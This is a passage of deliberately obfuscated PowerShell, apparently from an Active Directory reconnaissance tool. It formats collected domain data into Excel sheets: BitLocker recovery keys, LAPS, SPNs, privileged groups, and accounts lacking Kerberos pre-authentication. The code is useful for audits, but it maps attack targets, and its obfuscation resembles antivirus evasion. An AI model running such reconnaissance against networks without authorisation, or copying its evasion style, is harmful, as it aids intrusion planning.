            $workbook."Wo`RKshE`Ets".("{0}{1}" -f'Ite','m').Invoke(1)."H`yPeR`Links".("{1}{0}" -f'd','Ad').Invoke($workbook."W`OrK`ShEETs".("{0}{1}" -f'Ite','m').Invoke(1)."Ce`lLS".("{0}{1}"-f'Ite','m').Invoke(1,6) , ("{0}{3}{6}{1}{5}{4}{7}{2}" -f 'https://acs','au/','/ism/','c','nf','i','.gov.','osec'), "" , "", ("{1}{4}{0}{2}{3}{5}"-f'Con','2018 ','tro','l','ISM ','s')) | Out-Null
            $workbook."works`hEe`TS".("{0}{1}" -f 'It','em').Invoke(1)."HyPER`LI`NkS".("{0}{1}" -f'Ad','d').Invoke($workbook."W`oR`Ks`hEeTS".("{1}{0}" -f'em','It').Invoke(1)."cEl`lS".("{0}{1}"-f 'It','em').Invoke(1,7) , ("{1}{8}{9}{2}{7}{3}{6}{0}{4}{5}" -f'r','https:','cisecurity','/','ver','/','microsoft_windows_se','.org/benchmark','//','www.'), "" , "", ("{0}{1}{4}{3}{2}"-f 'CIS B','enchm','6','201','ark ')) | Out-Null

            $excel."Sc`R`e`EnUpdaTing" = $true
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\',("{1}{4}{0}{2}{3}" -f'n','Domain','tro','llers.csv','Co'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{5}{1}{0}{4}{3}"-f 'C','in ','Dom','llers','ontro','a')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{3}{0}{1}{4}"-f 'an','ges.c','GroupC','h','sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{3}{1}{0}{2}" -f 'ange','Ch','s','Group ')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{0}{1}{2}"-f'Group N','am','e')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}"-f'D','sv','ACLs.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}" -f'Ls','DAC')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}" -f 'SACL','v','s.cs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f 'S','ACLs')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{1}{0}" -f '.csv','POs','G'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f 'GPO','s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}{2}"-f 'gPLin','ks.c','sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{2}"-f'n','gPLi','ks')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}{2}" -f 'DNS','No','des'),("{0}{1}"-f '.cs','v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{1}{3}{0}"-f 'Records','N','D','S ')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{1}{0}" -f'ones.csv','SZ','DN'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{2}" -f 'NS ','D','Zones')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{0}{1}" -f'in','ters.csv','Pr'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{1}{0}" -f 's','nter','Pri')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{5}{4}{0}{2}{3}{1}"-f 'rRecov','.csv','e','ryKeys','ocke','BitL'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f'B','itLocker')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{0}{1}" -f'LAPS.c','sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}"-f 'APS','L')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{1}{3}{0}{4}{2}"-f 'rSP','Co','csv','mpute','Ns.'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{3}{0}{1}"-f 'N','s','Compute','r SP')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{0}{1}{2}" -f 'UserN','am','e')
        }

        $ADFileName = -join($ReportPath,'\',("{2}{0}{3}{1}" -f'rs','v','Compute','.cs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}" -f 'puters','Com')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{2}{1}{0}" -f 'erName','s','U')

            $worksheet = $workbook."w`oRK`sHEetS".("{1}{0}" -f 'tem','I').Invoke(1)
            
            $worksheet.("{0}{1}" -f 'Selec','t').Invoke()
            $worksheet."AP`PLi`CaTi`oN"."actI`VeWI`NDow"."sPLit`cOl`UMn" = 1
            $worksheet."apP`lICa`Ti`on"."AcT`I`VEWI`NdoW"."SPLi`TROW" = 1
            $worksheet."A`PPliC`At`Ion"."aCTiv`ew`indOw"."FreezEP`An`eS" = $true

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        $ADFileName = -join($ReportPath,'\',("{1}{0}"-f'.csv','OUs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name "OUs"
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{0}{1}"-f'o','ups.csv','Gr'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f 'Gr','oups')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{0}{1}{3}{2}"-f 'Distin','guishe','e','dNam')
        }

        $ADFileName = -join($ReportPath,'\',("{4}{2}{5}{0}{3}{1}"-f 'bers','sv','up','.c','Gro','Mem'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}{4}{2}{3}"-f 'up M','Gro','mbe','rs','e')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{1}{0}{2}"-f ' Na','Group','me')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{0}{2}{1}"-f 'serSPNs.c','v','s','U'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{1}"-f'ser ','SPNs','U')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',("{2}{3}{1}{0}"-f 'v','s','Us','ers.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}" -f'ers','Us')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName ("{1}{0}"-f 'erName','Us')

            $worksheet = $workbook."WORK`SHE`E`Ts".("{1}{0}" -f'm','Ite').Invoke(1)

            
            $worksheet.("{0}{1}" -f 'S','elect').Invoke()
            $worksheet."AP`pLI`CATiON"."a`CtIveWin`d`OW"."s`Pli`TC`olUMn" = 1
            $worksheet."A`Pp`LicAtIoN"."a`C`T`IvEWinDOW"."SPLITR`Ow" = 1
            $worksheet."a`PPlicati`On"."A`cTiv`eWIndoW"."fREEzEp`AN`ES" = $true

            $worksheet."c`elLS".("{1}{0}" -f'tem','I').Invoke(1,3)."In`TeRI`oR"."COlO`RIND`eX" = 5
            $worksheet."CE`lls".("{1}{0}"-f'em','It').Invoke(1,3)."fO`Nt"."COlo`RINd`ex" = 2
            
            $worksheet."u`S`E`DRANgE".("{0}{1}"-f'Sel','ect').Invoke() | Out-Null
            $excel."se`LEC`TIOn".("{0}{2}{1}"-f 'AutoFi','er','lt').Invoke(3,$true) | Out-Null
            $worksheet."C`elLS".("{0}{1}" -f'I','tem').Invoke(1,1).("{1}{2}{0}" -f'ct','S','ele').Invoke() | Out-Null
            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        
        $ADFileName = -join($ReportPath,'\',("{3}{1}{0}{4}{2}"-f '.c','mputerSPNs','v','Co','s'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{5}{4}{3}{0}{2}{1}"-f'ol','Stats','e ','R','uter ','Comp')
            Remove-Variable ADFileName

            $worksheet = $workbook."w`or`kSH`eetS".("{0}{1}" -f'Ite','m').Invoke(1)
            $PivotTableName = ("{2}{1}{3}{0}"-f 's','er ','Comput','SPN')
            Get-ADRExcelPivotTable -SrcSheetName ("{0}{2}{1}"-f'Compu','er SPNs','t') -PivotTableName $PivotTableName -PivotRows @(("{2}{1}{0}" -f'e','c','Servi')) -PivotValues @(("{1}{2}{0}"-f 'rvice','S','e'))

            $worksheet."cel`lS".("{1}{0}" -f 'm','Ite').Invoke(1,1) = ("{1}{3}{0}{2}"-f 'r ','Compu','Role','te')
            $worksheet."C`eLLs".("{1}{0}" -f'm','Ite').Invoke(1,2) = ("{0}{1}" -f'C','ount')

            
            $worksheet.("{1}{0}{3}{2}" -f'ot','Piv','bles','Ta').Invoke($PivotTableName).("{0}{2}{1}{3}" -f'Piv','tFi','o','elds').Invoke(("{1}{0}" -f 'rvice','Se'))."auTo`SorT"( (vaRiabLe  ('Yxl'+'2')  -valUe  )::"x`LdEs`CeN`dInG",("{0}{1}" -f 'C','ount'))

            Get-ADRExcelChart -ChartType ("{3}{4}{1}{0}{2}" -f 'ste','u','red','xlCo','lumnCl') -ChartLayout 10 -ChartTitle ("{4}{0}{3}{1}{2}" -f 't',' i','n AD','er Roles','Compu') -RangetoCover ("{2}{0}{1}" -f '2:','U16','D')
            $workbook."WoR`kShE`ETs".("{0}{1}" -f'I','tem').Invoke(1)."hYp`ErL`iNKs".("{0}{1}"-f'Ad','d').Invoke($workbook."w`orksHEe`TS".("{0}{1}" -f'I','tem').Invoke(1)."cE`lls".("{1}{0}" -f 'em','It').Invoke(1,4) , "" , ((("{3}{2}{4}{5}{6}{1}{0}{7}" -f 'A','!','r','F2UCompute',' SPNsF','2','U','1'))."REpLA`Ce"(([CHar]70+[CHar]50+[CHar]85),[strIng][CHar]39)), "", ("{1}{2}{0}"-f 'ata','Raw ','D')) | Out-Null
            $excel."W`INDo`ws".("{1}{0}" -f'em','It').Invoke(1)."di`splayGr`i`DL`iNes" = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        
        $ADFileName = -join($ReportPath,'\',("{0}{1}{2}" -f 'Compute','rs','.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{3}{0}{4}{1}" -f'ing Syste','ts','Oper','at','m Sta')
            Remove-Variable ADFileName

            $worksheet = $workbook."wOrK`Sh`eE`TS".("{1}{0}" -f'm','Ite').Invoke(1)
            $PivotTableName = ("{3}{0}{5}{1}{2}{4}" -f 'ati','Sys','t','Oper','ems','ng ')
            Get-ADRExcelPivotTable -SrcSheetName ("{2}{1}{0}" -f 'rs','ompute','C') -PivotTableName $PivotTableName -PivotRows @(("{1}{0}{2}" -f'ra','Ope','ting System')) -PivotValues @(("{3}{2}{1}{0}"-f 'm','ating Syste','per','O'))

            $worksheet."Ce`llS".("{1}{0}"-f 'm','Ite').Invoke(1,1) = ("{3}{1}{2}{0}{4}" -f'ting Sys','r','a','Ope','tem')
            $worksheet."C`ELLS".("{0}{1}" -f 'Ite','m').Invoke(1,2) = ("{0}{1}" -f'C','ount')

            
            $worksheet.("{0}{1}{2}"-f'Piv','otTabl','es').Invoke($PivotTableName).("{2}{1}{0}"-f'ds','ivotFiel','P').Invoke(("{1}{3}{2}{4}{0}"-f'em','Ope','ng ','rati','Syst'))."aUtoS`o`Rt"( $yxL2::"x`LDEs`CE`Nding",("{1}{0}"-f 'nt','Cou'))

            Get-ADRExcelChart -ChartType ("{1}{3}{2}{0}" -f'ustered','xlColu','Cl','mn') -ChartLayout 10 -ChartTitle ("{1}{4}{2}{0}{6}{3}{5}"-f's ','Opera','em','n A','ting Syst','D','i') -RangetoCover ("{1}{0}" -f':S16','D2')
            $workbook."Work`ShEE`Ts".("{1}{0}"-f'tem','I').Invoke(1)."h`Y`pErL`INks".("{1}{0}"-f 'd','Ad').Invoke($workbook."WORKS`H`Ee`TS".("{0}{1}" -f'Ite','m').Invoke(1)."ce`LlS".("{1}{0}" -f 'm','Ite').Invoke(1,4) , "" , ("{3}{1}{0}{2}"-f 'rs','e','!A1','Comput'), "", ("{1}{2}{0}" -f'a','Raw D','at')) | Out-Null
            $excel."wiN`dowS".("{0}{1}" -f'Ite','m').Invoke(1)."D`I`sPla`yGRidl`InES" = $false
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        
        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}" -f 'G','ers.csv','roupMemb'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{5}{0}{4}{1}{2}{3}"-f 'ivileg','d Group St','a','ts','e','Pr')
            Remove-Variable ADFileName

            $worksheet = $workbook."WOR`KSh`EEtS".("{0}{1}"-f'It','em').Invoke(1)
            $PivotTableName = ("{4}{3}{2}{1}{0}"-f's','ber','m','up Me','Gro')
            Get-ADRExcelPivotTable -SrcSheetName ("{0}{2}{3}{1}" -f 'G','rs','ro','up Membe') -PivotTableName $PivotTableName -PivotRows @(("{1}{0}{2}" -f'oup Nam','Gr','e'))-PivotFilters @(("{0}{3}{1}{2}" -f 'Ac','ountTyp','e','c')) -PivotValues @(("{1}{0}{2}"-f'tTyp','Accoun','e'))

            
            $worksheet.("{0}{1}{2}" -f'Pivo','tTab','les').Invoke($PivotTableName).("{0}{2}{1}"-f 'PivotFie','ds','l').Invoke(("{2}{0}{1}" -f 'ccount','Type','A'))."C`U`RREnTpAGE" = ("{0}{1}" -f 'us','er')

            $worksheet."Ce`lLs".("{1}{0}"-f 'm','Ite').Invoke(1,2)."in`TerI`OR"."c`O`loRiNDeX" = 5
            $worksheet."ce`LlS".("{1}{0}"-f'm','Ite').Invoke(1,2)."f`ONt"."CO`lOrI`N`dEX" = 2

            $worksheet."CE`lLS".("{1}{0}" -f 'tem','I').Invoke(3,1) = ("{1}{2}{0}"-f'me','Group N','a')
            $worksheet."C`EllS".("{1}{0}"-f 'tem','I').Invoke(3,2) = ("{2}{0}{3}{1}" -f'unt (No','ursive)','Co','t-Rec')

            $excel."S`cREEn`UPDaTing" = $false
            
            $PivotTableTemp = ($workbook.("{2}{3}{1}{0}"-f 'ches','a','Pivot','C').Invoke().("{1}{0}"-f 'tem','I').Invoke($workbook.("{1}{2}{0}"-f'tCaches','P','ivo').Invoke()."CO`UNT")).("{1}{2}{0}{3}" -f 'i','Cre','ateP','votTable').Invoke(("{0}{1}" -f'R1C','5'),("{0}{1}{2}"-f'P','ivotTableT','emp'))
            $PivotFieldTemp = $PivotTableTemp.("{2}{1}{0}{3}"-f 'eld','tFi','Pivo','s').Invoke(("{1}{0}{2}"-f 'p Nam','Grou','e'))
            
            $PivotFieldTemp."OrI`entA`T`ion" =  $GjQ::"X`Lp`AGeFielD"
            Try
            {
                $PivotFieldTemp."cURR`EN`TpaGe" = ("{4}{3}{1}{2}{0}" -f 'ns','m','i','omain Ad','D')
            }
            Catch
            {
                
                $NoDA = $true
            }
            If ($NoDA)
            {
                Try
                {
                    $PivotFieldTemp."C`UrreNt`Pa`Ge" = ("{0}{2}{1}" -f'Administrat','rs','o')
                }
                Catch
                {
                    
                }
            }
            
            $PivotSlicer = $workbook."sLicE`R`c`AcHEs".("{0}{1}"-f'Ad','d').Invoke($PivotTableTemp,$PivotFieldTemp)
            
            $PivotSlicer."P`IVotT`ABLeS".("{1}{3}{0}{2}" -f 'a','AddP','ble','ivotT').Invoke($worksheet.("{2}{0}{3}{1}"-f 'votTabl','s','Pi','e').Invoke($PivotTableName))
            
            $PivotSlicer.("{1}{0}"-f 'lete','De').Invoke()
            
            $PivotTableTemp."t`AblErAnG`e2".("{1}{0}" -f 'ete','Del').Invoke() | Out-Null

            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotFieldTemp
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotSlicer
            Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTableTemp

            Remove-Variable PivotFieldTemp
            Remove-Variable PivotSlicer
            Remove-Variable PivotTableTemp

            ("{2}{0}{4}{5}{1}{3}" -f 'o','perato','Acc','rs','un','t O'),("{1}{4}{2}{3}{0}"-f 's','Admin','s','trator','i'),("{1}{4}{0}{2}{3}"-f' ','Bac','Ope','rators','kup'),("{3}{1}{0}{2}{4}"-f 'bli',' Pu','she','Cert','rs'),("{0}{4}{1}{3}{2}"-f'Cr','to ','erators','Op','yp'),("{2}{0}{1}{3}"-f 'nsA','dmin','D','s'),("{2}{0}{3}{1}"-f'm','dmins','Do','ain A'),("{2}{4}{1}{3}{0}" -f 'ise Admins','te','E','rpr','n'),("{0}{5}{4}{2}{3}{1}"-f'Enterp','Admins','e K','ey ','s','ri'),("{1}{0}{4}{3}{2}"-f' Tru','Incoming Forest','lders','Bui','st '),("{0}{1}{2}"-f'Key Ad','min','s'),("{7}{11}{1}{4}{0}{9}{10}{6}{8}{3}{5}{2}" -f 'anced Th','oft Ad','nistrators','s','v',' Admi','Ana','Mic','lytic','re','at ','ros'),("{0}{1}{2}{5}{3}{4}"-f 'Network ','Oper','a','o','rs','t'),("{2}{0}{1}{3}{4}" -f'int O','perato','Pr','r','s'),("{2}{0}{1}"-f 's','ers','Protected U'),("{4}{3}{5}{2}{1}{0}"-f'ers','ktop Us','e Des','o','Rem','t'),("{4}{3}{2}{1}{0}"-f 's','min','Ad','ema ','Sch'),("{4}{2}{1}{0}{3}"-f 'ator','Oper','ver ','s','Ser') | ForEach-Object {
                Try
                {
                    $worksheet.("{1}{2}{3}{0}" -f 'es','P','ivot','Tabl').Invoke($PivotTableName).("{2}{3}{0}{1}"-f 'tFi','elds','Piv','o').Invoke(("{3}{1}{2}{0}"-f'e','p ','Nam','Grou')).("{0}{1}{2}" -f 'Piv','ot','Items').Invoke($_)."vi`Sible" = $true
                }
                Catch
                {
                    
                }
            }

            
            $worksheet.("{2}{1}{0}" -f'votTables','i','P').Invoke($PivotTableName).("{1}{2}{0}{3}" -f'F','P','ivot','ields').Invoke(("{2}{1}{0}"-f'ame','p N','Grou'))."au`T`OSoRt"(  $YxL2::"XldE`Scend`INg",("{2}{3}{0}{1}" -f't (Not-Recursi','ve)','Co','un'))

            $worksheet."ceL`LS".("{0}{1}"-f 'Ite','m').Invoke(3,1)."i`NTE`Rior"."coL`OrI`N`dEx" = 5
            $worksheet."c`eLLS".("{0}{1}"-f'I','tem').Invoke(3,1)."fO`Nt"."C`OloRi`N`deX" = 2

            $excel."ScReE`NUP`Da`TI`Ng" = $true

            Get-ADRExcelChart -ChartType ("{0}{4}{5}{1}{3}{2}"-f'xl','lumnC','tered','lus','C','o') -ChartLayout 10 -ChartTitle ("{2}{0}{1}{3}{4}"-f'ged Groups',' ','Privile','in ','AD') -RangetoCover ("{1}{0}" -f'6','D2:P1') -StartRow "A3" -StartColumn "B3"
            $workbook."wo`RkS`HE`Ets".("{0}{1}" -f'I','tem').Invoke(1)."hYPerl`I`NKs".("{0}{1}" -f 'Ad','d').Invoke($workbook."WorK`S`heeTs".("{1}{0}"-f 'm','Ite').Invoke(1)."C`eLls".("{1}{0}"-f'tem','I').Invoke(1,4) , "" , ((("{3}{4}{0}{1}{2}" -f 'p',' Memb','ersw8V!A1','w8V','Grou'))  -RePLaCE'w8V',[CHAr]39), "", ("{1}{0}" -f'aw Data','R')) | Out-Null
            $excel."w`ind`oWS".("{0}{1}"-f'I','tem').Invoke(1)."d`is`PL`AYGRidlInES" = $false

            Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
            Remove-Variable worksheet
        }

        
        $ADFileName = -join($ReportPath,'\',("{0}{1}{2}"-f 'Co','mputer','s.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{2}{3}{0}" -f 'tats','Comp','ute','r S')
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.("{0}{1}"-f'Ad','d').Invoke(("{3}{1}{0}{2}{4}" -f 'eg','el','ation ','D','Typ'),((("{0}{3}{2}{4}{1}" -f '{0}U','d{0}','constrai','n','ne'))  -f [CHar]34))
            $ObjAttributes.("{1}{0}" -f'dd','A').Invoke(("{0}{3}{2}{1}" -f 'Deleg','e','ion Typ','at'),((("{2}{1}{4}{5}{0}{3}" -f'in','C','px5','edpx5','ons','tra'))."rePl`A`ce"('px5',[STrING][cHAR]34)))
            $ObjAttributes.("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}" -f 'SI','y','DHistor'),'"*"')
            $ObjAttributes.("{0}{1}" -f'A','dd').Invoke(("{1}{2}{0}" -f 't','Do','rman'),((("{0}{2}{1}" -f '{0}TR','}','UE{0')) -f[CHaR]34))
            $ObjAttributes.("{1}{0}" -f 'd','Ad').Invoke(((("{3}{2}{1}{0}" -f'e (> ','g','assword A','P'))),((("{2}{3}{0}{1}" -f'R','UE{0}','{','0}T'))  -F[chAr]34))
            $ObjAttributes.("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{4}{3}{2}"-f'ms','-d','id','torS','s-Crea'),'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName ("{2}{1}{0}" -f 's','uter','Comp') -Title1 ("{0}{2}{4}{3}{1}"-f 'Comp',' AD','uter','ounts in',' Acc') -PivotTableName ("{4}{1}{5}{3}{0}{2}"-f's Stat','ute','us','t','Comp','r Accoun') -PivotRows ("{0}{1}" -f 'En','abled') -PivotValues ("{0}{2}{1}"-f 'UserN','e','am') -PivotPercentage ("{0}{1}" -f 'Us','erName') -Title2 ("{6}{1}{4}{3}{0}{5}{2}" -f 'r Acco','Co','ts','pute','m','un','Status of ') -ObjAttributes $ObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType ("{0}{1}" -f 'x','lPie') -ChartLayout 3 -ChartTitle ("{4}{2}{3}{1}{0}" -f 'unts in AD','o',' Ac','c','Computer') -RangetoCover ("{1}{2}{0}" -f'3','A','11:D2') -ChartData $workbook."WoRKSh`Ee`Ts".("{1}{0}"-f 'em','It').Invoke(1).("{1}{0}" -f'ge','Ran').Invoke(("{2}{0}{1}" -f':A4,B3:','B4','A3'))
            $workbook."wo`Rk`S`HEets".("{1}{0}"-f 'em','It').Invoke(1)."hy`peRL`IN`KS".("{1}{0}" -f'd','Ad').Invoke($workbook."wOR`K`SheETS".("{1}{0}" -f 'm','Ite').Invoke(1)."Ce`lLs".("{1}{0}"-f 'tem','I').Invoke(10,1) , "" , ("{1}{2}{3}{0}"-f '1','Compu','ter','s!A'), "", ("{1}{0}" -f ' Data','Raw')) | Out-Null

            Get-ADRExcelChart -ChartType ("{1}{2}{0}"-f'ed','xlBarClust','er') -ChartLayout 1 -ChartTitle ("{0}{3}{4}{2}{5}{1}"-f'Status o','counts','p','f Co','m','uter Ac') -RangetoCover ("{2}{1}{0}" -f ':L23','11','F') -ChartData $workbook."wO`Rk`sH`eETS".("{0}{1}" -f'It','em').Invoke(1).("{0}{1}"-f'R','ange').Invoke(("{1}{2}{0}"-f'G8','F2:F','8,G2:'))
            $workbook."w`ORKsHE`etS".("{0}{1}" -f'Ite','m').Invoke(1)."H`YPeRL`inkS".("{1}{0}" -f'dd','A').Invoke($workbook."WOrkSh`E`EtS".("{1}{0}" -f 'tem','I').Invoke(1)."cEl`LS".("{1}{0}" -f 'tem','I').Invoke(10,6) , "" , ("{2}{1}{0}" -f's!A1','ter','Compu'), "", ("{0}{1}"-f'Raw',' Data')) | Out-Null

            $workbook."wO`RkSHeE`TS".("{0}{1}" -f'Ite','m').Invoke(1)."u`sE`DraNGe"."eNT`IR`EColUMn".("{1}{2}{0}" -f 'oFit','Au','t').Invoke() | Out-Null
            $excel."wINdO`wS".("{0}{1}" -f 'I','tem').Invoke(1)."di`SpLAygrI`D`lINEs" = $false
        }

        
        $ADFileName = -join($ReportPath,'\',("{0}{3}{2}{1}"-f'Users','v','s','.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}{2}{3}" -f'U','s','er Stat','s')
            Remove-Variable ADFileName

            $ObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            $ObjAttributes.("{0}{1}"-f 'Ad','d').Invoke(("{4}{6}{7}{5}{0}{2}{1}{3}"-f 'Pas','rd ','swo','at Logon','Mus','ge ','t Ch','an'),((("{1}{0}"-f 'TRUE5yR','5yR'))."Re`p`lace"('5yR',[striNg][cHAr]34)))
            $ObjAttributes.("{0}{1}" -f'Ad','d').Invoke(("{3}{2}{0}{1}{4}" -f 'nge P','asswo','a','Cannot Ch','rd'),((("{3}{2}{1}{0}" -f 'jW','6','RUE','6jWT'))-creplacE  '6jW',[Char]34))
            $ObjAttributes.("{0}{1}"-f'A','dd').Invoke(("{1}{6}{5}{2}{0}{3}{4}" -f 'rd N','Pa','o','ever Exp','ires','sw','s'),((("{1}{0}{2}" -f'0}','{','TRUE{0}')) -F  [chaR]34))
            $ObjAttributes.("{1}{0}" -f'dd','A').Invoke(("{0}{8}{1}{4}{9}{2}{3}{5}{7}{6}" -f'Re','e','Password',' En','rsib','cry','ion','pt','v','le '),((("{1}{2}{0}"-f 'o','ywoTR','UEyw'))."ReP`laCe"('ywo',[STrInG][cHar]34)))
            $ObjAttributes.("{0}{1}"-f 'A','dd').Invoke(("{3}{2}{0}{1}{4}"-f 'Logon ','Require','martcard ','S','d'),((("{2}{1}{0}" -f 'UEjoX','R','joXT'))."r`ePLaCe"(([chAR]106+[chAR]111+[chAR]88),[strInG][chAR]34)))
            $ObjAttributes.("{0}{1}" -f 'Ad','d').Invoke(("{0}{3}{2}{1}{4}" -f 'Deleg','e','mitt','ation Per','d'),((("{1}{0}" -f'RUEr6w','r6wT'))-cREPLACe  'r6w',[cHaR]34))
            $ObjAttributes.("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{0}{3}"-f 'beros DES O','r','Ke','nly'),((("{0}{2}{1}"-f '{0','TRUE{0}','}'))-F [CHar]34))
            $ObjAttributes.("{1}{0}"-f 'dd','A').Invoke(("{3}{0}{1}{2}"-f 's',' ','RC4','Kerbero'),((("{0}{1}{2}" -f'smA','TR','UEsmA'))  -REPLAce  ([chaR]115+[chaR]109+[chaR]65),[chaR]34))
            $ObjAttributes.("{1}{0}" -f 'd','Ad').Invoke(("{5}{3}{6}{0}{4}{2}{1}"-f'ot Re','uth',' A','oe','quire Pre','D','s N'),((("{0}{2}{1}{3}" -f '{0','0','}TRUE{','}'))  -F  [chAR]34))
            $ObjAttributes.("{1}{0}"-f'dd','A').Invoke(((("{1}{0}{2}" -f'rd Age ','Passwo','(> '))),((("{0}{2}{3}{1}"-f'{','{0}','0}','TRUE')) -f[CHAR]34))
            $ObjAttributes.("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{2}{3}" -f'Accou','nt Lo','cked Ou','t'),((("{3}{0}{2}{1}" -f 'TRU','0}','E{','{0}')) -f  [cHAr]34))
            $ObjAttributes.("{1}{0}" -f 'd','Ad').Invoke(("{3}{1}{0}{2}"-f ' Log','ever','ged in','N'),((("{0}{1}{3}{2}" -f'{','0','RUE{0}','}T'))  -f  [cHAR]34))
            $ObjAttributes.("{0}{1}"-f'A','dd').Invoke(("{0}{1}" -f 'Dor','mant'),((("{2}{3}{1}{0}" -f'6','Sn','S','n6TRUE')) -REPLaCE  ([ChaR]83+[ChaR]110+[ChaR]54),[ChaR]34))
            $ObjAttributes.("{1}{0}" -f 'dd','A').Invoke(("{4}{0}{3}{5}{2}{6}{1}"-f 'wor','d','r','d Not Requ','Pass','i','e'),((("{0}{2}{1}"-f '{','}TRUE{0}','0')) -F [cHar]34))
            $ObjAttributes.("{1}{0}"-f'dd','A').Invoke(("{3}{0}{2}{1}{4}"-f 'gat','Ty','ion ','Dele','p'),((("{3}{4}{2}{5}{1}{0}" -f'ed{0}','in','const','{','0}Un','ra'))-F  [cHaR]34))
            $ObjAttributes.("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{0}" -f 'istory','H','SID'),'"*"')

